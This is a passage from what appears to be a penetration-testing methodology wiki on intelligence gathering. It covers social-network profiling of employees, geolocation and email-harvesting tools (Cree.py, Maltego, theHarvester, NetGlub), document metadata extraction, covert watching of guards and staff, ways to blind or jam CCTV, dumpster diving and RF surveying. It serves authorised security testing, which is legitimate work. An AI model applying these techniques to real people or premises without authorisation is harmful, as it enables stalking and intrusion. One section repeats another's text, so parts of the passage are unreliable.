http://www.qapacity.com ] |A a business-oriented social networking site and a business directory |- |Quechup |[ http://quechup.com/ http://quechup.com ] |General, friendship, dating |- |Qzone |[ http://qzone.qq.com/ http://qzone.qq.com ] |General. In Simplified Chinese; caters for mainland China users |- |Raptr |[ http://raptr.com/ http://raptr.com ] |Video games |- |Ravelry |[ http://www.ravelry.com/ http://www.ravelry.com ] |Knitting and crochet |- |Renren |[ http://renren.com/ http://renren.com ] |Significant site in China. |- |ResearchGate |[ http://researchgate.net/ http://researchgate.net ] |Social network for scientific researchers |- |ReverbNation.com |[ http://www.reverbnation.com/ http://www.reverbnation.com ] |Social network for musician and bands |- |Ryze |[ http://www.ryze.com/ http://www.ryze.com ] |Business |- |ScienceStage |[ http://sciencestage.com/ http://sciencestage.com ] |Science-oriented multimedia platform and network for scientists |- |Scispace.net |[ http://scispace.net/ http://scispace.net ] |Collaborative network site for scientists |- |ShareTheMusic |[ http://www.sharethemusic.com/ http://www.sharethemusic.com ] |Music Community. Sharing and listening to music for free and legally |- |Shelfari |[ http://www.shelfari.com/ http://www.shelfari.com ] |Books |- |Skyrock |[ http://skyrock.com/ http://skyrock.com ] |Social Network in French-speaking world |- |Social Life |[ http://www.sociallife.com.br/ http://www.sociallife.com.br ] |Brazilian jet set and social elite world-wide |- |SocialVibe |[ http://www.socialvibe.com/ http://www.socialvibe.com ] |Social Network for Charity |- |Sonico.com |[ http://www.sonico.com/ http://www.sonico.com ] |General. Popular in Latin America and Spanish and Portuguese speaking regions. |- |Stickam |[ http://www.stickam.com/ http://www.stickam.com ] |Live video streaming and chat. |- |StudiVZ |[ http://www.studivz.net/ http://www.studivz.net ] |University students, mostly in the German-speaking countries. School students and those out of education sign up via its partner sites sch\u00b8lerVZ and meinVZ. |- |StumbleUpon |[ http://www.stumbleupon.com/ http://www.stumbleupon.com ] |Stumble through websites that match your selected interests |- |Tagged |[ http://www.tagged.com/ http://www.tagged.com ] |General. Subject to quite some controversy about its e-mail marketing and privacy policy |- |Talkbiznow |[ http://www.talkbiznow.com/ http://www.talkbiznow.com ] |Business networking |- |Taltopia |[ http://www.taltopia.com/ http://www.taltopia.com ] |Online artistic community |- |Taringa! |[ http://www.taringa.net/ http://www.taringa.net ] |General |- |TeachStreet |[ http://www.teachstreet.com/ http://www.teachstreet.com ] |Education / Learning / Teaching - More than 400 subjects |- |TravBuddy.com |[ http://www.travbuddy.com/ http://www.travbuddy.com ] |Travel |- |Travellerspoint |[ http://www.travellerspoint.com/ http://www.travellerspoint.com ] |Travel |- |tribe.net |[ http://www.tribe.net/ http://www.tribe.net ] |General |- |Trombi.com |[ http://www.trombi.com/ http://www.trombi.com ] |French subsidiary of Classmates.com |- |Tuenti |[ http://www.tuenti.com/ http://www.tuenti.com ] |Spanish-based university and High School social network. Very Popular in Spain |- |Tumblr |[ http://www.tumblr.com/ http://www.tumblr.com ] |General. Micro-blogging, RSS |- |Twitter |[ http://twitter.com/ http://twitter.com ] |General. Micro-blogging, RSS, updates |- |twitpic |[ http://twitpic.com/ http://twitpic.com ] | |- |Vkontakte |[ http://vkontakte.ru/ http://vkontakte.ru/ ] |Social Network for Russian-speaking world including former Soviet republics. Biggest site in Russia |- |Vampirefreaks.com |[ http://www.vampirefreaks.com/ http://www.vampirefreaks.com ] |Gothic and industrial subculture |- |Viadeo |[ http://www.viadeo.com/ http://www.viadeo.com ] |Global Social Networking and Campus Networking available in English, French, German, Spanish, Italian and Portuguese |- |Virb |[ http://www.virb.com/ http://www.virb.com ] |Social network that focuses heavily on artists, including musicians and photographers |- |Vox |[ http://www.vox.com/ http://www.vox.com ] |Blogging |- |Wakoopa |[ http://social.wakoopa.com/ http://social.wakoopa.com ] |For computer fans that want to discover new software and games |- |Wattpad |[ http://www.wattpad.com/ http://www.wattpad.com ] |For readers and authors to interact & e-book sharing |- |Wasabi |[ http://www.wasabi.com/ http://www.wasabi.com ] |General. UK-based. |- |WAYN |[ http://www.wayn.com/ http://www.wayn.com ] |Travel and lifestyle |- |WebBiographies |[ http://www.webbiographies.com/ http://www.webbiographies.com ] |Genealogy and biography |- |WeeWorld |[ http://www.weeworld.com/ http://www.weeworld.com ] |Teenagers - 10 to 17 |- |WeOurFamily |[ http://www.weourfamily.com/ http://www.weourfamily.com ] |General with emphasis on privacy and security |- |Wer-kennt-wen |[ http://www.wer-kennt-wen.de/ http://www.wer-kennt-wen.de ] |General |- |weRead |[ http://weread.com/ http://weread.com ] |Books |- |Windows Live Spaces |[ http://spaces.live.com/ http://spaces.live.com ] |Blogging (formerly MSN Spaces) |- |WiserEarth |[ http://www.wiserearth.org/ http://www.wiserearth.org ] |Online community space for the social justice and environmental movement |- |Wordpress |[ http://wordpress.org/ http://wordpress.org ] | |- |WorldFriends |[ http://www.worldfriends.tv/ http://www.worldfriends.tv ] | |- |Xanga |[ http://www.xanga.com/ http://www.xanga.com ] |Blogs and \"metro\" areas |- |XING |[ http://www.xing.com/ http://www.xing.com ] |Business (primarily Europe (Germany, Austria, Switzerland) and China) |- |Xt3 |[ http://www.xt3.com/ http://www.xt3.com ] |Catholic social networking, created after World Youth Day 2008 |- |Yammer |[ http://www.yammer.com/ http://www.yammer.com ] |Social networking for office colleagues |- |Yelp, Inc. |[ http://www.yelp.com/ http://www.yelp.com ] |Local Business Review and Talk |- |Yfrog |[ http://yfrog.com/ http://yfrog.com ] | |- |Youmeo |[ http://youmeo.com/ http://youmeo.com ] |UK Social Network (focus on data portability) |- |Zoo.gr |[ http://www.zoo.gr/ http://www.zoo.gr ] |Greek Web Meeting point |- |Zooppa |[ http://zooppa.com/ http://zooppa.com ] |Online Community for Creative Talent (host of brand sponsored advertising contests) |} '''Tone and Frequency''' Identifying an employee's tone and frequency of postings can be a critical indicator of a disgruntled employee as well as the corporate acceptance of social networking. While time consuming it is possible to establish an employee's work schedule and vacation periods. '''Location awareness''' Most social networking sites offer the ability to include geolocation information in postings. This information can be useful in identifying exactly where the person was physically located when a posting was made. In addition, it is possible that geolocation information is included in images that are uploaded to social networking sites. It is possible that the user may be savy enough to turn this off, however, sometimes it's just as simple as reading a post that indicates exactly where they're located. Cree.py Cree.py is Beta tool that is used to automate the task of information gathering from Twitter as well as FourSquare. In addition, Cree.py can gather any geolocation data from flickr, twitpic.com, yfrog.com, img.ly, plixi.com, twitrpix.com, foleext.com, shozu.com, pickhur.com, moby.to, twitsnaps.com and twitgoo.com. Cree.py is an open source intelligence gathering application. To install Cree.py, you will need to add a repository to your /etc/apt/sources.list. echo \"deb http://people.dsv.su.se/~kakavas/creepy/ binary/\" >> /etc/apt/sources.list Update package list apt-get update Install creepy apt-get install creepy [[:File:Penetration_Testing_Execution_03.png|Cree.py Interface]] Cree.py is primarily targeting geolocation related information about users from social networking platforms and image hosting services. The information is presented in a map inside the application where all the retrieved data is shown accompanied with relevant information (i.e. what was posted from that specific location) to provide context to the presentation. [[:File:Penetration_Testing_Execution_04.png|Cree.py Interface]] Internet Footprint Internet Footprinting is where we attempt to gather externally available information about the target infrastructure that we can leveraged in later phases. Email addresses Gathering email addresses while seemingly useless can provide us with valuable information about the target environment. It can provide information about potential naming conventions as well as potential targets for later use. There are many tools that can be used to gather email addresses, Maltego for example. Maltego Paterva [ http://www.paterva.com/ Maltego] is used to automate the task of information gathering. Maltego is an open source intelligence and forensics application. Essentially, Maltego is a data mining and information-gathering tool that maps the information gathered into a format that is easily understood and manipulated. It saves you time by automating tasks such as email harvesting and mapping subdomains. The documentation of Maltego is relatively sparse so we are including the procedures necessary to obtain the data required. Once you have started Maltego, the main interface should be visible. The six main areas of the interface are the toolbar, the Palette, graph(view) area, overview area, the detailed area, and the property area. ''' [[:File:Penetration_Testing_Execution_05.png|Screenshot Here]] ''' Here is a suggested workflow to get you started, consider it a training exercise rather than absolute since you will want to customize your workflow depending on your engagement. To start, look to the very upper left-hand corner of Maltego and click the \"new graph\" button. After that, drag the \"domain\" item out of the palette onto the graph. The graph area allows you to process the transforms as well as view the data in either the mining view, dynamic view, edge weighted view as well as the entity list. When you first add the domain icon to your graph, it will default to \"paterva.com\" double-click on that icon and change the name to your target's domain(without any subdomain such as www). Now you are ready to start mining. Right click(or double-click) on the domain icon and from \"run transform\" select the \"To Website DNS[using search engine]\". This will hopefully result in all of the subdomains for your target showing up. Select all of the subdomains and run the \"To IP Address [DNS] transform\". This should resolve all of the subdomains to their respective IP Addresses. ''' [[:File:Penetration_Testing_Execution_07.png|Screenshot Here]] ''' From this point you could chose a couple different paths depending on the size of your target but a logical next step is to determine the netblocks so run the \"To Netblock [Using natural boundaries]\" transform. After this point, you should be able to use your imagination as to where to go next. You will be able to cultivate phone numbers, email addresses, geo location information and much more by using the transforms provided. The Palette contains all the transforms that are available (or activated) for use. As of this writing, there are approximately 72 transforms. One limitation of the \"Community Edition\" of Maltego is that any given transform will only return 12 results whereas the professional version doesn't have any limitations. Resist the temptation to run \"all transforms\" since this will likely overload you with data and inhibit your ability to drill down to the most interesting pieces of data that are relevant to your engagement. Maltego is not just limited to the pre-engagement portion of your pentest. You can also import csv/xls dumps of your airodump results back into Maltego to help you visualize the networks. TheHarvester TheHarvester is a tool, written by Christian Martorella, that can be used to gather e-mail accounts and subdomain names from different public sources (search engines, pgp key servers). Is a really simple tool, but very effective. root@pentest:/pentest/enumeration/theharvester# ./theHarvester.py ************************************* *TheHarvester Ver. 1.6 * *Coded by Christian Martorella * *Edge-Security Research * *cmartorella@edge-security.com * ************************************* Usage: theharvester options -d: domain to search or company name -b: data source (google,bing,pgp,linkedin) -s: start in result number X (default 0) -v: verify host name via dns resolution -l: limit the number of results to work with(bing goes from 50 to 50 results, google 100 to 100, and pgp does'nt use this option) Examples:./theharvester.py -d microsoft.com -l 500 -b google ./theharvester.py -d microsoft.com -b pgp ./theharvester.py -d microsoft -l 200 -b linkedin TheHarvester will search the specified data source and return the results. This should be added to the OSINT document for use at a later stage. root@pentest:/pentest/enumeration/theharvester# ./theHarvester.py -d client.com -b google -l 500 ************************************* *TheHarvester Ver. 1.6 * *Coded by Christian Martorella * *Edge-Security Research * *cmartorella@edge-security.com * ************************************* Searching for client.com in google : ###################################### Limit: 500 Searching results: 0 Searching results: 100 Searching results: 200 Searching results: 300 Searching results: 400 Accounts found: #################### admin@client.com nick@client.com jane@client.com sarah@client.com NetGlub NetGlub is an open source tool that is very similar to Maltego. NetGlub is a data mining and information-gathering tool that presents the information gathered in a format that is easily understood. The documentation of NetGlub is nonexistent at the moment so we are including the procedures necessary to obtain the data required. Installing NetGlub is not a trivial task, but one that can be accomplished by running the following: apt-get install build-essential mysql-server libmysqlclient-dev zlib1g-dev libperl-dev libnet-ip-perl libopenssl-ruby ruby-dev ruby omt php5-cli nmap libnet-dns-perl libnet-ip-perl python-dev wget http://pypi.python.org/packages/source/s/simplejson/simplejson-2.1.5.tar.gz tar -xzvf simplejson-2.1.5.tar.gz cd simplejson-2.1.5 python2.7 setup.py build python2.7 setup.py install cd .. wget http://sourceforge.net/projects/pyxml/files/pyxml/0.8.4/PyXML-0.8.4.tar.gz tar -xvzf PyXML-0.8.4.tar.gz cd PyXML-0.8.4 wget http://launchpadlibrarian.net/31786748/0001-Patch-for-Python-2.6.patch patch -p1 < 0001-Patch-for-Python-2.6.patch python setup.py install cd /pentest/enumeration At this point we're going to use a GUI installation of the QT-SDK. The main thing to point out here is that the installation path needs to be changed during the installation to reflect /opt/qtsdk. If you use a different path, then you will need to update the paths in the script below to reflect that difference. Note that during the QT-SDK installation we are reminded for external dependencies, so make sure we run \"apt-get install libglib2.0-dev libSM-dev libxrender-dev libfontconfig1-dev libxext-dev\". wget http://blog.hynesim.org/ressources/install/qt-sdk-linux-x86-opensource-2010.03.bin chmod +x qt-sdk-linux-x86-opensource-2010.03.bin ./qt-sdk-linux-x86-opensource-2010.03.bin wget http://www.graphviz.org/pub/graphviz/stable/SOURCES/graphviz-2.26.3.tar.gz tar -xzvf graphviz-2.26.3.tar.gz cd graphviz-2.26.3 ./configure make make install cd /pentest/enumeration wget http://redmine.lab.diateam.net/attachments/download/1/netglub-1.0.tar.gz tar -xzvf netglub-1.0.tar.gz mv netglub-1.0 netglub cd /pentest/enumeration/netglub/qng/ /opt/qtsdk/qt/bin/qmake make Now we need to start MySQL and create the netglub database start mysql mysql -u root -ptoor create database netglub; use netglub; create user \"netglub\"@\"localhost\"; set password for \"netglub\"@\"localhost\" # password(\"netglub\"); GRANT ALL ON netglub.* TO \"netglub\"@\"localhost\"; quit mysql -u root -ptoor netglub < /pentest/enumeration/netglub/master/tools/sql/netglub.sql cd /opt/qtsdk/qt/src/plugins/sqldrivers/mysql/ /opt/qtsdk/qt/bin/qmake INCLUDEPATH+#/usr/include/mysql/ make cp /opt/qtsdk/qt/src/plugins/sqldrivers/mysql/libqsqlmysql.so /opt/qtsdk/qt/plugins/sqldrivers/. cd /pentest/enumeration/netglub/master /opt/qtsdk/qt/bin/qmake make cd tools/ ./install.sh cd /pentest/enumeration/netglub/slave /opt/qtsdk/qt/bin/qmake make cd tools/ ./install.sh wget http://sourceforge.net/projects/xmlrpc-c/files/Xmlrpc-c%20Super%20Stable/1.16.34/xmlrpc-c-1.16.34.tgz/download tar -zxvf xmlrpc-c-1.16.34.tgz cd xmlrpc-c-1.16.34 ./configure make make install Once you have installed NetGlub, you'll probably be interested in running it. This is really a four step process: Ensure that MySQL is running: start mysql Start the NetGlub Master: /pentest/enumeration/netglub/master/master Start the NetGlub Slave: /pentest/enumeration/netglub/slave/slave Start the NetGlub GUI: /pentest/enumeration/netglub/qng/bin/unix-debug/netglub Now the main interface should be visible. If you are familiar with Maltego, then you will feel right at home with the interface. The six main areas of the interface are the toolbar, the Palette, graph, (or view) area, details, and the property area. ''' [[:File:Penetration_Testing_Execution_166.png|Screenshot Here]] ''' A complete list of all the transforms that are available (or activated) for use. As of this writing, there are approximately 33 transforms. A transform is script that will actually perform the action against a given site. ''' [[:File:Penetration_Testing_Execution_167.png|Screenshot Here]] ''' The graph area allows you to process the transforms as well as view the data in either the mining view, dynamic view, edge weighted view as well as the entity list. The overview area provides a mini-map of the entities discovered based upon the transforms. The detail area is where it is possible to drill into the specifics of the entity. It is possible to view such things as the relationships, as well as details of how the information was generated. The property area allows you to see the specific properties of the transform populated with the results specific to the entity. To begin using NetGlub we need to drag and drop a transform from the Palette to the Graph Area. By default, this will be populated with dummy data. To edit the entity within the selected transform, do so by editing the entries within the property view. We first need to determine the Internet infrastructure such as Domains. To perform this we will drag and drop the Domain transform to the graph area. Edit the transform to reflect the appropriate domain name for the client. It is possible to collect nearly all the data that we will initially require by clicking on Run All Transforms. The data from these entities will be used to obtain additional information. Within the graph area the results will be visible as illustrated below. ''' [[:File:Penetration_Testing_Execution_168.png|Screenshot Here]] ''' Selecting the entities and choosing to run additional transforms the data collected will expand. If a particular transform has not be used that you want to collect data from, simply drag it to the graph area and make the appropriate changes within the property view. There will be some information that you will need to enter to ensure that NetGlub functions properly. For example, you will need to enter in DNS servers which to query. In addition, you will be asked to provide your Alchemy and Open calais API keys. For Alchemy, you will need to go to [ http://www.alchemyapi.com/api/register.html http://www.alchemyapi.com/api/register.html ] to receive your own API key. For Open calais, you will need to go to [ http://www.opencalais.com/APIkey http://www.opencalais.com/APIkey ] to receive your own API key. Usernames/Handles Identifying usernames and handles that are associated with a particular email is useful as this might provide several key pieces of information. For instance, it could provide a significant clue for username and passwords. In addition, it can also indicate a particular individual's interest outside of work. A good place to location this type of information is within discussion groups (Newsgroups, Mailing lists, forums, chat rooms, etc.). Social Networks [ http://www.checkusernames.com/ Check Usernames] - Useful for checking the existence of a given username across 160 Social Networks. Newsgroups [ http://www.google.com/ Google] - [ http://www.google.com/ http://www.google.com ] [ http://groups.yahoo.com/ Yahoo Groups] - [ http://groups.yahoo.com/ http://groups.yahoo.com ] [ http://www.delphiforums.com/ Delphi Forums ] - [ http://www.delphiforums.com/ http://www.delphiforums.com ] [ http://www.big-boards.com/ Big Boards] - [ http://www.big-boards.com/ http://www.big-boards.com ] Mailing Lists TILE.Net - [ http://tile.net/lists http://tile.net/lists ] Topica - [ http://lists.topica.com/ http://lists.topica.com ] L-Soft CataList, the Official Catalog of LISTSERV lists - [ http://www.lsoft.com/lists/listref.html http://www.lsoft.com/lists/listref.html ] The Mail Archive - [ http://www.mail-archive.com/ http://www.mail-archive.com ] Chat Rooms SearchIRC - [ http://searchirc.com/ http://searchirc.com ] Gogloom - [ http://www.gogloom.com/ http://www.gogloom.com ] Forums Search BoardReader - [ http://boardreader.com/ http://boardreader.com ] Omgili - [ http://www.omgili.com/ http://www.omgili.com ] Personal Domain Names The ability to locate personal domains that belong to target employees can yield additional information such as potential usernames and passwords. In addition, it can also indicate a particular individual's interest outside of work. Personal Activities It is not uncommon for individuals to create and publish audio files and videos. While these may be seem insignificant, they can yield additional information about a particular individual's interest outside of work. Audio iTunes - [ http://www.apple.com/itunes http://www.apple.com/itunes ] Podcast.com - [ http://podcast.com/ http://podcast.com ] Podcast Directory - [ http://www.podcastdirectory.com/ http://www.podcastdirectory.com ] Yahoo! Audio Search - [ http://audio.search.yahoo.com/ http://audio.search.yahoo.com ] Video YouTube - [ http://youtube.com/ http://youtube.com ] Yahoo Video - [ http://video.search.yahoo.com/ http://video.search.yahoo.com ] Google Video - [ http://video.google.com/ http://video.google.com ] Bing Video - [ http://www.bing.com/videos http://www.bing.com/videos ] Archived Information There are times when we will be unable to access web site information due to the fact that the content may no longer be available from the original source. Being able to access archived copies of this information allows access to past information. There are several ways to access this archived information. The primary means is to utilize the cached results under Google's cached results. As part of an NVA, it is not uncommon to perform Google searches using specially targeted search strings: cache: < site.com > Note: Replace < site.com > with the name of the domain that you wish to perform the search on. An additional resource for archived information is the Wayback Machine ( http://www.archive.org ). ''' [[:File:Penetration_Testing_Execution_09.png|Screenshot Here]] ''' Electronic Data Collection of electronic data in direct response to reconnaissance and intelligence gathering should be focused on the target business or individual. Document leakage Publicly available documents should be gathered for essential data (date, time, location specific information, language, and author). Data collected could provide insight into the current environment, operational procedures, employee training, and human file_suport. Metadata leakage Identifying Metadata is possible using specialized search engine. The goal is to identify data that is relevant to the target corporation. It may be possible to identify locations, hardware, software and other relevant data from Social Networking posts. Some search engines that provide the ability to search for Metadata are as follows: ixquick - [ http://ixquick.com/ http://ixquick.com ] MetaCrawler - [ http://metacrawler.com/ http://metacrawler.com ] Dogpile - [ http://www.dogpile.com/ http://www.dogpile.com ] Search.com - [ http://www.search.com/ http://www.search.com ] Jeffery's Exif Viewer - [ http://regex.info/exif.cgi http://regex.info/exif.cgi ] In addition to search engines, several tools exist to collect files and gather information from various documents. FOCA (Windows) FOCA is a tool that reads metadata from a wide range of document and media formats. FOCA pulls the relevant usernames, paths, software versions, printer details, and email addresses. This can all be performed without the need to individually download files. Foundstone SiteDigger (Windows) Foundstone has a tool, named SiteDigger, which allows us to search a domain using specially strings from both the Google Hacking Database (GHDB) and Foundstone Database (FSDB). This allows for slightly over 1640 potential queries available to discover additional information. ''' [[:File:Penetration_Testing_Execution_10.png|Screenshot Here]] ''' The specific queries scanned as well as the results of the queries are shown. To access the results of a query, simply double-click on the link provided to open in a browser. Metagoofil (Linux/Windows) Metagoofil is a Linux based information gathering tool designed for extracting metadata of public documents (.pdf, .doc, .xls, .ppt, .odp, .ods) available on the client's websites. Metagoofil generates an html results page with the results of the metadata extracted, plus a list of potential usernames that could prove useful for brute force attacks. It also extracts paths and MAC address information from the metadata. Metagoofil has a few options available, but most are related to what specifically you want to target as well the number of results desired. ''' [[:File:Penetration_Testing_Execution_11.png|Screenshot Here]] ''' The command to run ''metagoofil ''is as follows: metagoofil.py -d < client domain > -l 100 -f all -o < client domain > .html -t micro-files Exif Reader (Windows) Exif Reader is image file analysis software for Windows. It analyzes and displays the shutter speed, flash condition, focal length, and other image information included in the Exif image format which is supported by almost all the latest digital cameras. Exif image files with an extension of JPG can be treated in the same manner as conventional JPEG files. This software analyzes JPEG files created by digital cameras and can be downloaded from [ http://www.takenet.or.jp/~ryuuji/minisoft/exifread/english http://www.takenet.or.jp/ ~ ryuuji/minisoft/exifread/english]. ExifTool (Windows/ OS X) Exif Tool is a Windows and OS X tool for reading Meta information. ExifTool supports a wide range of file formats. ExifTool can be downloaded from [ http://www.sno.phy.queensu.ca/~phil/exiftool http://www.sno.phy.queensu.ca/ ~ phil/exiftool]. Image Search While not directly related to metadata, Tineye is also useful: http://www.tineye.com/ If a profile is found that includes a picture, but not a real name, Tineye can sometimes be used to find other profiles on the Internet that may have more information about a person (including personals sites). Covert gathering On-location gathering On-Site visits also allow assessment personnel to observe and gather information about the physical, environmental, and operational security of the target. Adjacent Facilities Once the physical locations have been identified, it is useful to identify the adjacent facilities. Adjacent facilities should be documented and if possible, include any observed shared facilities or services. Physical security inspections Covert Physical security inspections are used to ascertain the security posture of the target. These are conducted covertly, clandestinely and without any party knowing they are being inspected. Observation is the key component of this activity. Physical security measures that should be observed include physical security equipment, procedures, or devices used to protect from possible threats. A physical security inspection should include, but is not limited to the following: Security guards Observing security guards (or security officer) is often the first step in assessing the most visible deterrence. Security guards are uniformed and act to protect property by maintaining a high visibility presence to deter illegal and inappropriate actions. By observing security guard movements directly it is possible to determine procedures in use or establish movement patterns. You will need to observe what the security guards are protecting. It is possible to utilize binoculars to observe any movement from a safe distance. Some security guards are trained and licensed to carry firearms for their own safety and for personnel they are entrusted to protect. The use of firearms by security guards should not be a surprise, if noted. This should be documented prior to beginning the engagement. If firearms are observed, ensure that precaution is taken not to take any further action unless specifically authorized and trained to do so. Badge Usage Badge usage refers to a physical security method that involves the use of identification badges as a form of access control. Badging systems may be tied to a physical access control system or simply used as a visual validation mechanism. Observing individual badge usage is important to document. By observing, badge usage it may be possible to actually duplicate the specific badge being utilized. The specific items that should be noted are if the badge is required to be visible or shown to gain physical access to the property or facility. Badge usage should be documented and if possible, include observed validation procedures. Locking devices A locking device is a mechanical or electronic mechanism often implemented to prevent unauthorized ingress or egress. These can be as simple as a door lock, dead-bolt, or complex as a cipher lock. Observing the type and placement location of the locking devices on doors it is possible to determine if the door in primarily used for ingress or egress. You will need to observe what the locking devices are protecting. All observations should be documented prior, and if possible photographs taken. Intrusion detection systems (IDS)/Alarms Observing security guards (or security officer) is often the first step in assessing the most visible deterrence. Security guards are uniformed and act to protect property by maintaining a high visibility presence to deter illegal and inappropriate actions. By observing security guard movements directly it is possible to determine procedures in use or establish movement patterns. You will need to observe what the security guards are protecting. It is possible to utilize binoculars to observe any movement from a safe distance. Some security guards are trained and licensed to carry firearms for their own safety and for personnel they are entrusted to protect. The use of firearms by security guards should not be a surprise, if noted. This should be documented prior to beginning the engagement. If firearms are observed, ensure that precaution is taken not to take any further action unless specifically authorized and trained to do so. Security lighting Security lighting is often used as a preventative and corrective measure on a physical piece of property. Security lighting may aid in the detection of intruders, act as deterrence to intruders, or in some cases simply to increase the feeling of safety. Security lighting is often an integral component to the environmental design of a facility. Security lighting includes floodlights and low pressure sodium vapor lights. Most Security lighting that is intended to be left on all night is of the high-intensity discharge lamp variety. Other lights may be activated by sensors such as passive infrared sensors (PIRs), turning on only when a person (or other mammal) approaches. PIR activated lamps will usually be incandescent bulbs so that they can activate instantly; energy saving is less important since they will not be on all the time. PIR sensor activation can increase both the deterrent effect (since the intruder knows that he has been detected) and the detection effect (since a person will be attracted to the sudden increase in light). Some PIR units can be set up to sound a chime as well as turn on the light. Most modern units have a photocell so that they only turn on when it is dark. While adequate lighting around a physical structure is deployed to reduce the risk of an intrusion, it is critical that the lighting be implemented properly as poorly arranged lighting can actually obstruct viewing the facility they're designed to protect. Security lighting may be subject to vandalism, possibly to reduce its effectiveness for a subsequent intrusion attempt. Thus security lights should either be mounted very high, or else protected by wire mesh or tough polycarbonate shields. Other lamps may be completely recessed from view and access, with the light directed out through a light pipe, or reflected from a polished aluminum or stainless steel mirror. For similar reasons high security installations may provide a stand-by power supply for their security lighting. Observe and document the type, number, and locations of security lighting in use. Surveillance /CCTV systems Surveillance/CCTV systems may be used to observe activities in and around a facility from a centralized area. Surveillance/CCTV systems may operate continuously or only when activated as required to monitor a particular event. More advanced Surveillance/CCTV systems utilize motion-detection devices to activate the system. IP-based Surveillance/CCTV cameras may be implemented for a more decentralized operation. Surveillance/CCTV cameras can be of a conspicuous nature, which are used as a visible deterrence, as well as an inconspicuous nature. Surveillance/CCTV cameras are generally small high definition color cameras that can not only focus to resolve minute detail, but by linking the control of the cameras to a computer, objects can be tracked semi-automatically. Observing and documenting the Surveillance/CCTV system is critical for identifying the areas of coverage. While it might not be possible to determine the specific camera type being utilized or even the area of coverage it is possible to identify areas with or without limited coverage. It should be noted if the Surveillance/CCTV system is physically protected. If not, then it needs to be documented if the Surveillance/CCTV camera is vulnerable to someone deliberately destroying it. Additionally, a physically unprotected camera may be subject to blurring or blocking the image by spraying substances or obstructing the lens. Lasers can be used to blind or damage Surveillance/CCTV cameras. For wireless Surveillance/CCTV systems, broadcasting a signal at the same frequency as the wireless equipment could make it subject to jamming. Access control devices Access control devices enable access control to areas and/or file_suport in a given facility. Access control refers to the practice of restricting entrance to a property, a building, or a room to authorized persons. Access control can be achieved by a human (a security guard, or receptionist), through mechanical means such as locks and keys, or through technological means such as access control systems like the Access control vestibule. Access control devices historically were accomplished through keys and locks. Electronic access control use is widely being implemented to replace mechanical keys. Access control readers are generally classified as Basic, Semi-intelligent, and Intelligent. A basic access control reader simply reads a card number or PIN and forward it to a control panel. The most popular type of access control readers are RF Tiny by RFLOGICS, ProxPoint by HID, and P300 by Farpointe Data. Semi-intelligent readers have inputs and outputs necessary to control door hardware (lock, door contact, exit button), but do not make any access decisions. Common Semi-intelligent readers are InfoProx Lite IPL200 by CEM Systems and AP-510 by Apollo. Intelligent readers have all the inputs and outputs necessary to control door hardware while having the memory and the processing power necessary to make access decisions independently of each other. Common Intelligent readers are the InfoProx IPO200 by CEM Systems, AP-500 by Apollo, PowerNet IP Reader by Isonas Security Systems, ID08 by Solus has the built in web service to make it user friendly, Edge ER40 reader by HID Global, LogLock and UNiLOCK by ASPiSYS Ltd, and BioEntry Plus reader by Suprema Inc. Some readers may have additional features such as an LCD and function buttons for data collection purposes (i.e. clock-in/clock-out events for attendance reports), camera/speaker/microphone for intercom, and smart card read/write support. Observe and document the type, number, and locations of access control devices in use. Environmental Design Environmental design involves the surrounding environmental of a building, or facility. In the scope of Physical security, environmental design includes facilities geography, landscape, architecture, and exterior design. Observing the facilities and surrounding areas can highlight potential areas of concern such as potential obscured areas due to geography and landscaping. Architecture and exterior design can impact the ability of security guards to protect property by creating areas of low or no-visibility. In addition, the placement of fences, storage containers, security guard shacks, barricades and maintenance areas could also prove useful in the ability move around a facility in a covert manner. Employee Behavior Observing employees is often the one of the easier steps to perform. Employee actions generally provide insight into any corporate behaviors or acceptable norms. By observing, employees it is possible to determine procedures in use or establish ingress and egress traffic patterns. It is possible to utilize binoculars to observe any movement from a safe distance. Dumpster diving Traditionally, most targets dispose of their trash in either garbage cans or dumpsters. These may or may not be separated based upon the recyclability of the material. The act of dumpster diving is the practice of sifting through commercial or residential trash to find items that have been discarded by their owners, but which may be useful. This is often times an extremely dirty process that can yield significant results. Dumpsters are usually located on private premises and therefore may subject the assessment team to potentially trespassing on property not owned by the target. Though the law is enforced with varying degrees of rigor, ensure that this is authorized as part of the engagement. Dumpster diving per se is often legal when not specifically prohibited by law. Rather than take the refuse from the area, it is commonly accepted to simply photograph the obtained material and then return it to the original dumpster. RF / Wireless Frequency scanning A band is a section of the spectrum of radio communication frequencies, in which channels are usually used or set aside for the same purpose. To prevent interference and allow for efficient use of the radio spectrum, similar services are allocated in bands of non-overlapping ranges of frequencies. As a matter of convention, bands are divided at wavelengths of 10 n meters, or frequencies of 3?10 n hertz. For example, 30 MHz or 10 m divides shortwave (lower and longer) from VHF (shorter and higher). These are the parts of the radio spectrum, and not its frequency allocation. Each of these bands has a basic band plan which dictates how it is to be used and shared, to avoid interference, and to set protocol for the compatibility of transmitters and receivers. Within the US, band plans are allocated and controlled by the Federal Communications Commission (FCC). The chart below illustrates the current band plans. [[:File:Penetration_Testing_Execution_12.png|Screenshot Here]] To avoid confusion, there are two bands that we could focus on our efforts on. The band plans that would in of interest to an attacker are indicated in the following chart. {|border#\"2\" cellspacing#\"0\" cellpadding#\"4\" width#\"100%\" |align # \"center\"| '''Band name''' |align # \"center\"| '''Abbr''' |align # \"center\"| '''ITU band''' |align # \"center\"| '''Frequency and wavelength in air''' |align # \"center\"| '''Example uses''' |- |Very high frequency |VHF |8 |30-300 MHz 10 m - 1 m |FM, television broadcasts and line-of-sight ground-to-aircraft and aircraft-to-aircraft communications. Land Mobile and Maritime Mobile communications, amateur radio, weather radio |- |Ultra high frequency |UHF |9 |300-3000 MHz 1 m - 100 mm |Television broadcasts, microwave ovens, mobile phones, wireless LAN, Bluetooth, ZigBee, GPS and two-way radios such as Land Mobile, FRS and GMRS radios, amateur radio |} A Radio Frequency (RF) site survey or wireless survey, sometimes called a wireless site survey, is the process of determining the frequencies in use within a given environment. When conducting a RF site survey, it's very important to identify an effective range boundary, which involves determining the SNR at various points around a facility. To expedite the process, all frequencies in use should be determined prior to arrival. Particular attention should be paid to security guards, and frequencies that the target is licensed to use. Several file_suport exist to assist in acquiring this information: {|border#\"2\" cellspacing#\"0\" cellpadding#\"4\" width#\"100%\" | '''Site''' | '''URL''' | '''Description''' |- |Radio Reference |[ http://www.radioreference.com/apps/db/ http://www.radioreference.com/apps/db/ ] |Free part of the site containing a wealth of information |- |National Radio Data |[ http://www.nationalradiodata.com/ http://www.nationalradiodata.com/ ] |FCC database search / $29 year |- |Percon Corp |[ http://www.perconcorp.com/ http://www.perconcorp.com ] |FCC database search / Paid site - custom rates |} 